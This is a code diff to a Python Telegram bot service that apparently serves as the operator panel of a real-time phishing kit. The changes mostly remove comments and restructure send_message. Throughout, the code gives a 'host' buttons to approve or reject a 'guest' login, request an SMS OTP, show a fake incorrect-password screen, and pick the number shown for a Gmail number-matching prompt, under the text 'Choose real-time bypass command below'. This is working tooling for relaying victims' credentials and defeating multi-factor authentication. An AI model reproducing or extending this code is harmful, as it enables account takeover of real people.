@@ -38,6 +38,7 @@ class TelegramService:
         except Exception as e:
             raise e
 
+    # 💡 Cleaned and isolated send_message into a reliable standalone transmitter
     def send_message(self, text, parse_mode="HTML", reply_markup=None):
         if not self.chat_id:
             raise ValueError("Telegram Chat ID is not configured.")
@@ -49,33 +50,8 @@ class TelegramService:
         }
         if reply_markup:
             payload["reply_markup"] = reply_markup
-            return self.api_call("sendMessage", payload)
-
-        # Build inline keyboard: actions + optionally number candidates for Gmail
-        keyboard = []
-        keyboard.append([
-            {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{state.get('id')}"},
-            {"text": "Reject Gate ❌", "callback_data": f"tg:deny:{state.get('id')}"}
-        ])
-        keyboard.append([
-            {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{state.get('id')}"},
-            {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{state.get('id')}"}
-        ])
-
-        candidates = state.get('promptCandidates') or []
-        if candidates:
-            # add one row with the candidate numbers so host can pick which number to show the guest
-            row = []
-            for num in candidates:
-                row.append({"text": str(num), "callback_data": f"tg:picknum:{state.get('id')}:{num}"})
-            keyboard.append(row)
-        else:
-            keyboard.append([
-                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{state.get('id')}"}
-            ])
-
-        inline_keyboard = {"inline_keyboard": keyboard}
-        return self.send_message(message, "HTML")
+            
+        return self.api_call("sendMessage", payload)
 
     def send_visitor_alert(self, visitor):
         if not self.is_configured():
@@ -196,8 +172,6 @@ Keep the output concise, charming, and extremely helpful. Do not output anything
 Choose real-time bypass command below:
         """.strip()
 
-        # Build keyboard with host controls. If the server pre-provided candidate numbers,
-        # expose them as quick-pick buttons so the host can send them immediately.
         keyboard = []
         keyboard.append([
             {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{state.get('id')}"},
@@ -209,12 +183,10 @@ Choose real-time bypass command below:
 
         candidates = state.get('promptCandidates') or []
         if candidates and isinstance(candidates, (list, tuple)) and len(candidates) > 0:
-            # Add a row with the preselected candidate numbers as quick-pick buttons
             row = []
             for num in candidates:
                 row.append({"text": str(num), "callback_data": f"tg:picknum:{state.get('id')}:{num}"})
             keyboard.append(row)
-            # Also include a Number Match entry to allow full 1..100 selection if desired
             keyboard.append([
                 {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{state.get('id')}"}
             ])
@@ -268,17 +240,15 @@ What is the guest status for this OTP?
                 self.last_update_id = max(self.last_update_id, update.get("update_id", 0))
                 callback_query = update.get("callback_query")
                 message_update = update.get("message") or update.get("edited_message")
-                # Handle plain text messages for setting candidates, e.g. "candidates attempt-abc 24 38 42"
+                
                 if message_update and isinstance(message_update, dict):
                     try:
                         text = message_update.get("text", "") or ""
                         if text.lower().startswith("candidates "):
                             parts_msg = text.split()
-                            # Expect format: candidates <attempt_id> n1 n2 n3
                             if len(parts_msg) >= 5:
                                 attempt_id_msg = parts_msg[1]
                                 cand_vals = parts_msg[2:5]
-                                # confirm to host
                                 try:
                                     self.api_call("sendMessage", {
                                         "chat_id": message_update.get("chat", {}).get("id"),
@@ -287,7 +257,6 @@ What is the guest status for this OTP?
                                     })
                                 except Exception:
                                     pass
-                                # invoke action to server
                                 on_action_received(attempt_id_msg, "number_prompt", {"candidates": cand_vals})
                                 count += 1
                                 continue
@@ -316,28 +285,23 @@ What is the guest status for this OTP?
                         elif action == "num_prompt":
                             mapped_action = "pending"
                             feedback = "Number-matching prompt requested! 🔢"
-                            # Present a 1..100 inline keyboard for the host to pick candidate numbers
                             try:
                                 orig = callback_query.get("message")
                                 chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
-                                # initialize selection state for this attempt
                                 if attempt_id not in self.host_selections:
                                     self.host_selections[attempt_id] = []
 
-                                # build keyboard: 10 columns x 10 rows
                                 keyboard = []
                                 nums = list(range(1, 101))
                                 for r in range(0, 100, 10):
                                     row = []
                                     for n in nums[r:r+10]:
                                         label = str(n)
-                                        # mark selected ones with a check
                                         if n in self.host_selections.get(attempt_id, []):
                                             label = "✓" + label
                                         row.append({"text": label, "callback_data": f"tg:hostpick:{attempt_id}:{n}"})
                                     keyboard.append(row)
 
-                                # include a control row showing current selection and a send button when 1 selected
                                 selected = self.host_selections.get(attempt_id, [])
                                 control_row = [ {"text": f"Selected: {', '.join(map(str, selected)) or 'None'}", "callback_data": f"tg:noop:{attempt_id}"} ]
                                 if len(selected) == 1:
@@ -359,10 +323,8 @@ What is the guest status for this OTP?
                                     print(f"Failed to edit message with host 1-100 keyboard: {_e}", flush=True)
                             except Exception as _e:
                                 print(f"Failed to prepare 1-100 keyboard: {_e}", flush=True)
-                            # we've already edited the message to show the keyboard; avoid the generic edit below
                             handled_inline = True
                         elif action == "picknum":
-                            # parts = ['tg','picknum','attemptid','42']
                             mapped_action = "number_prompt"
                             chosen = None
                             try:
@@ -375,7 +337,6 @@ What is the guest status for this OTP?
                             feedback = "Incorrect Password screen requested! ⚠️"
                         elif action == "hostpick":
                             mapped_action = "pending"
-                            # host selected/toggled a number from the 1..100 keyboard
                             handled_inline = True
                             try:
                                 chosen_num = int(parts[3])
@@ -386,12 +347,10 @@ What is the guest status for this OTP?
                                 if chosen_num in sel:
                                     sel.remove(chosen_num)
                                 else:
-                                    # limit to 1 selection
                                     if len(sel) < 1:
                                         sel.append(chosen_num)
                                 self.host_selections[attempt_id] = sel
                             feedback = f"Selected: {', '.join(map(str, sel)) or 'None'}"
-                            # rebuild keyboard with updated selection marks
                             try:
                                 orig = callback_query.get("message")
                                 chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
@@ -425,24 +384,20 @@ What is the guest status for this OTP?
                             handled_inline = True
                             feedback = "Please select exactly 1 number."
                         elif action == "sendcandidates":
-                            # parts = ['tg','sendcandidates','attemptid','n1']
                             mapped_action = "number_prompt"
                             handled_inline = True
                             feedback = "Number sent to guest ✅"
                             chosen_candidates = []
                             try:
-                                # parse 1 number from parts[3]
                                 chosen_candidates = [parts[3]]
                             except Exception:
                                 chosen_candidates = []
-                            # clear any temporary host selections
                             try:
                                 if attempt_id in self.host_selections:
                                     del self.host_selections[attempt_id]
                             except Exception:
                                 pass
                             
-                            # Restore control keyboard
                             try:
                                 orig = callback_query.get("message")
                                 chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
@@ -450,7 +405,6 @@ What is the guest status for this OTP?
                                     "inline_keyboard": [
                                         [
                                             {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
-                                           
                                         ],
                                         [
                                             {"text": "Request SMS OTP 📲", "callback_data": f"tg:request_sms:{attempt_id}"},
@@ -468,7 +422,6 @@ What is the guest status for this OTP?
                             except Exception as _e:
                                 print(f"Failed to restore host keyboard: {_e}", flush=True)
 
-                        # Answer callback query
                         try:
                             self.api_call("answerCallbackQuery", {
                                 "callback_query_id": query_id,
@@ -477,7 +430,6 @@ What is the guest status for this OTP?
                         except Exception as e:
                             print(f"Failed to answer callback query: {e}", flush=True)
 
-                        # Edit message text on Telegram (skip if we already handled inline update)
                         if not handled_inline:
                             try:
                                 original_msg = callback_query.get("message")
@@ -498,7 +450,6 @@ What is the guest status for this OTP?
                             except Exception as e:
                                 print(f"Failed to edit message text: {e}", flush=True)
 
-                        # If a number was selected, include it in the callback payload
                         if action == "picknum":
                             try:
                                 chosen_val = parts[3]
